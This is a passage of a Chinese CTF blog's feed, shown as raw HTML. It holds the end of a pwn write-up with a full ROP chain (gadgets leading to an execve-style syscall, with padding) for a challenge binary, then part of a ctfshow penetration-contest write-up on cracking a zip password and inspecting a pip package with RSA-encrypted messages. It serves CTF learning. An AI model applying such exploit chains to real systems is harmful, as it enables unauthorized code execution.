class="token punctuation">,</span> <span class="token number">0x00000000004113f3</span><span class="token punctuation">)</span> <span class="token comment"># pop rsi ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000006bb0e8</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 8</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x000000000044cb86</span><span class="token punctuation">)</span> <span class="token comment"># pop rdx ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000006bb0e8</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 8</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004458a0</span><span class="token punctuation">)</span> <span class="token comment"># xor rax, rax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000475e30</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000401dac</span><span class="token punctuation">)</span> <span class="token comment"># syscall</span><span class="token keyword">print</span><span class="token punctuation">(</span>b64encode<span class="token punctuation">(</span><span class="token string">b"A"</span><span class="token operator">*</span><span class="token number">0x70</span><span class="token operator">+</span><span class="token string">b"A"</span><span class="token operator">*</span><span class="token number">0x8</span><span class="token operator">+</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>手动玩贪吃蛇到2分后，q退出跳转到后门函数，打入payload即可</p><p><img src="/blog/2025/01/09/%E7%AC%AC%E5%85%AB%E5%B1%8A%E5%B7%A5%E4%B8%9A%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%A4%8D%E8%B5%9B/image-20250110115102546.png" alt="image-20250110115102546"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;不知道啊，听说在海南打就去了（&lt;/p&gt;</summary>
    
    
    
    <category term="线下赛" scheme="http://c1oudfl0w0.github.io/blog/categories/%E7%BA%BF%E4%B8%8B%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>ctfshow元旦渗透赛</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/</id>
    <published>2024-12-31T11:58:52.000Z</published>
    <updated>2025-01-13T16:36:12.392Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>马上就要期末考但还是来打了，给3-1困了好几天，还好最后没挂科（</p><p>官方wp：<a href="https://ysynrh77rj.feishu.cn/docx/F3nJdGJHjo1DSBx8c2TcecLrnvh">https://ysynrh77rj.feishu.cn/docx/F3nJdGJHjo1DSBx8c2TcecLrnvh</a></p><span id="more"></span><hr><h1 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h1><h2 id="启程"><a href="#启程" class="headerlink" title="启程"></a>启程</h2><p><del>出师未捷身先死</del></p><p>hint：</p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">6332468885045739207798242375080077355892316665891880211715759509399402551400860520908019724111820758062002779222649162563769520681049420842627327653028697570023368621511584229066629851913921934625112891871237543378546847020163969961987899081707281756262252814062564762160798635747507687871699694751527174309034601497055974635051437994874886300646949625353558253782655181334148321351659981250042829128658958363792059338950291542877888243170008437712513314359394103899575725527464109331033472122605333514068765847981281168351027057708345483333279522044142183133967673483865459337003717067807320811287647328283988796540276949990614458889846521960577177616236664713902265004190473545460095268491900380558170082520224728576953003878275008182317199296267075737759724512554280591198406698260860277025465102137918643581832045307760200048667705365456953303241675697777911751700448120282274949664588640026605985924903540176391580279688363295982824196664632859001756744080268810527371486113951531943901306283561047843588041585812947331967034769134340552094418027084857234553229856544474009457347175105099512591554624971894599838746900995752415971119041937111084886165664866650538846290845643642053197978121486841730575238128406845555442419014173176404421806730649214788953146176851031811997323821914774362578122351737794097455302561907117362800799157551057036577218572856787471028581031618485255309875312810807897548663541884705879790370871272092175498582934779006508008372003215236813420967574992987533634390592255398695736558142823465028853521646032675657687007258165839140903999201766151183184688594176955338531845223421284906472573394877068730983517293944705652691178721839660327167016317868190701523720009185011216522451173878805968328968074937750042295853272548720830984864809212598178047616120161664500748924315852951589930193222279698129328148259041368119935965463251204093790728630387918548913200711797328676820417414861331435109809773835504522004547179742451417443447941411851982452178390931131018648260880134788113098629170784876904104322308416089636533044499374973277839771616505181221794837479001656285339681656874034743331472071702858650617822101028852441234915319854953097530971129078751008161174490025795476490498225822900160824277065484345528878744325480894129738333972010830499621263685185404636669845444451217075393389824619014562344105122537381743633355312869522701477652030663877906141024174678002699020634123988360384365275976070300277866252980082349473657<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>仔细看一下三行应该是代表n，p，q</p><p>还给了加密压缩包，不会misc，启程失败（</p><p>哎卧槽怎么是爆6位数字</p><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20241231203107904.png" alt="image-20241231203107904"></p><p>难绷</p><p>flag：<code>ctfshow&#123;654321&#125;</code></p><hr><h2 id="破解加密通讯"><a href="#破解加密通讯" class="headerlink" title="破解加密通讯"></a>破解加密通讯</h2><p><img src="/blog/2024/12/31/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9B/image-20241231203318579.png" alt="image-20241231203318579"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">import</span> secretMessageResponse    <span class="token keyword">except</span> ImportError<span class="token punctuation">:</span>        <span class="token keyword">import</span> pip        pip<span class="token punctuation">.</span>main<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'install'</span><span class="token punctuation">,</span> <span class="token string">'secretMessageResponse'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">from</span> secretMessageResponse <span class="token keyword">import</span> printMessage<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个是所谓的特工保密的通讯手法</p><p>pip secretMessageResponse 库下来看看源码</p><p>printMessage.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token punctuation">,</span>datetimemessage <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"inputMessage_20241216"</span> <span class="token punctuation">:</span><span class="token triple-quoted-string string">'''gHgAsclUVPhWDv4S8Oa8SuRTDaj+V0dI4z2jrQwfvfSFWilWwMKwNULUI48UBLS2shZcm/yv2/e5Hq5VRDfXkdxCYQMdvdnvONtpm2yNiIaLpDV4Rs8fOXJ6kcaeT+mg4RkIIFgx35w4J1KgO72pSP8j1p+R9f9TNMafwJ91XmO4QTcOYkMKQMddKvhbyMXzJkSS0uZqEppNSIUnVX9b7m8PmMjV0uHShvb1Zc8UQWJWUJ3cOxwNasOeMQGxJrZXPkxIxDYzm3f0tXbCgvdgNZ8TQY7u+iCXjOtD6xnUsdSahnPq14BD30CilIfsG0r/klPHfxQ+psmHSX47Ylai0TtgfbHWJJ4lSo0ojMvTx6HYK8zmAoCmg4OGXDbv/IjJgYU1w24na0iXZCNtcjB9MLRNck00c20f/uS64Ss0Ixii8nmfsFOjQBCcIYN+HGmOnj5Uw8DVJrxlOmcfQciG3rzuIvYlbOdGMcyarTy2Ba7iZfoovYZObPscAwhNLWqbU4tuR78aOVxiXTFRY7+Y0x2eRT5sulcvB3vsKuDMlNrxaUgiFUohPBZGNsgQgyCPxxqk0NpUn0bbHLH+vBebjJxaim4AU28ctWW8xv7xpxVttb0EoohtK2cIHr79ep5XrU/rv4R58obD/o+QqI1Mrb4wwpX9tsL7ZbROw/MXJwM='''</span><span class="token punctuation">,</span>    <span class="token string">"inputMessage_20240411"</span> <span class="token punctuation">:</span> <span class="token triple-quoted-string string">'''Z93Khatj+AWZcpPwIqu8LzbJ8xb8CuVMI8okE0qwoQD2IC2lixg77mJZireOrbW7zFkDsk1hP67dROJZwVUDrYot2g5GxX/xy7lGjIblUX4iJVUtP4mHqZUgKROaLoh/gippMpP+8Ik2X/QRBx5gdhq0xam+wuVC+77/tyu8Fd/DohKbAMp8aaJsFr/W4mLDZ1gv4JK+2O3l+bAvpodBRTzb0ld5zD2ueYvjTudoDjdanQP1oVTH7pkDO2Vb+SsdIyTi2C410JEOF4Qm8mzVHtiOunOcLVpAlQsM6/LdhqsTNelXl/Myb84NGxwGWVmx6j2QejiL7S1hHeHlmQ9ExHeURPdZAvKhgMCemYXu3BGlFq3ydb5SkqwLFvM4vJ6XUBcWkHT8eijBFF6Y7YgOv9GRvBTnsAQhUBp4W4EAMtXkDdToG+S8ZO7El8Gh8jaWC49n5CuUBRz3z2GeOVbsBamfLV06IO5v78jGHXig4saEFKHvYSIGewyUCVQEGoIR5xOTJBTUTePAdvQjfg28vZZxFB/hIYNDUHkaek1Mg1UH5HWGgsCX1In5hSX/9eBkznEhzeWnJ1yMsYkj+ddN34DLQSrHc83geXMcoW3Ah3cAQG8E8bszvKL3hme+T5rOeENjkOAgYhf84k4YlxDskdwvzyu8HkE9CSaBpDP6lKI='''</span><span class="token punctuation">,</span>    <span class="token string">"inputMessage_20240305"</span> <span class="token punctuation">:</span> <span class="token triple-quoted-string string">'''ckDSthpl5DDJMpBE26Jqk8EjaSq7MUntdwLHPouwx6D38un6WQfLJ9wgDyjh9GA/ICJR7WrwWsVinr6y3u9w+ubMZ0mqmtnphzQraagk8NkKc1u1+qGp8llsud3C8mvJWa4GYa9KEhnACDHwppPKJDCfr1HKwPbR0NIi+1Aunmy6DeOKRkFwysnrSco5QiiC9+gdXFhQDmN9KEiYW6Pc3mWVbqFiJgRW3/Df6638oGPm6AUcgRnEWMKiluyN81frM9VNtCeJ64YrU6Rgx4D153YxNNQbLTcyCQMamHTrJnhxPojkuDqbEcU+iiN4offwrQyr4eEu9ecvmyD2w/n7pAOsVnqSzroBujVA+CK6Zq8Uie15mL5yWG9hD5ZcbSwnRmtqK3yl0Xl91hgn1JqcIEKtf+MnMQPr80uoxT3mz8IX8pyVnyyw1x6F+IK1I2G+5w6rUDjhzIbME5XB9hopwcswsXrMo9PP6/5Sz1noJrsu6k6WN8ZM0MyRIav+xuKP1+cYzlPSQZrMo3L4ieHQnBbsoyzGVf9QONMwaooGOrxu88ZWlGe8e7eyCzteeNSVOC2zqtQiwQJIgfp2UwTymA/cEjOICWVzUXwbE5wWUBPCLp2C/XWc82byrOHAFXHLOVKgolVToUpZ5uOvizgk/ahaxdGxGa9CrRyr6sf+goA='''</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">printMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> key<span class="token punctuation">,</span> value <span class="token keyword">in</span> message<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        title <span class="token operator">=</span> key<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'inputMessage_'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m"</span> <span class="token operator">+</span> <span class="token string">"请使用组织分配的私钥解密后使用"</span> <span class="token operator">+</span> <span class="token string">"\033[0m"</span><span class="token punctuation">)</span>        title <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>strptime<span class="token punctuation">(</span>title<span class="token punctuation">,</span> <span class="token string">'%Y%m%d'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">'%Y-%m-%d'</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"----------------------------------------------------------"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>title<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"----------------------------------------------------------"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token comment"># 最新流通公钥</span><span class="token keyword">def</span> <span class="token function">getPublicKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token triple-quoted-string string">b'''    -----BEGIN PUBLIC KEY-----MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAmziayo9Tddo1FYdrtOswyjLYJ5frYKEwm4rQTsKU8UcdnnDRgms+ZmStoqlH/qi6x+D1K3fvvioCnGZLFHZwBUqbgT5x+qUmUaVMll9FOT7ZJ05w8n8Ljqa1akzFMU5G7YbCr3vQwN63vwvD9/63TDbXkJrv1fGl2rHpPwp5OPCUeCB3nIFIRCWHpJU7sHJqIP5vzV8KNJtbxgR+dhszdg+NhoBDUpxoVN5lzSKr2TMOLFLZaQR9AWOV/aHV8gjTkTLDZfc+XlfhxiDMTQdiUTbk/tynpt+JFrDA8vL5/TOmuxgumqgXZIPGrIUbwloTYyHD/XXmvXu5KE8g3eMKgxNxuEKM5bMTESBK9A7Q2Kj3eNp0Rvb5Aleg7h8/YbQemGelY/o5xpUyHgHjsfNQ3j/xhdhVCNVaXZF64V/YVpvC9Cq29F7qI+bl6FlN7zSpuHB3QgNS1uXOmjBCsA7ypZoWmdXeaLIO+I3kP48BBSmue4nidJifiK/kSOcZ0iegRXV1hyZ6pYdDE7hM5V5t5tvayJ31zRQNT2ALAFeCDozVWELHTnphkPkQO+SOPglrVz0S1dXicqRofXWMj7PJOFkBpWIX0aywMIh1woEAawUs3RM2pfLUNtqUTfodSCmWlwcpGrBWG5NACx7csPFtzWn8oPZfzL346at5DDIwD2kCAwEAAQ==-----END PUBLIC KEY-----'''</span><span class="token keyword">def</span> <span class="token function">enctryptMessage</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">import</span> base64    message_bytes <span class="token operator">=</span> message<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>      message_base64 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>message_bytes<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    publicKey <span class="token operator">=</span> getPublicKey<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">from</span> cryptography<span class="token punctuation">.</span>hazmat<span class="token punctuation">.</span>backends <span class="token keyword">import</span> default_backend    <span class="token 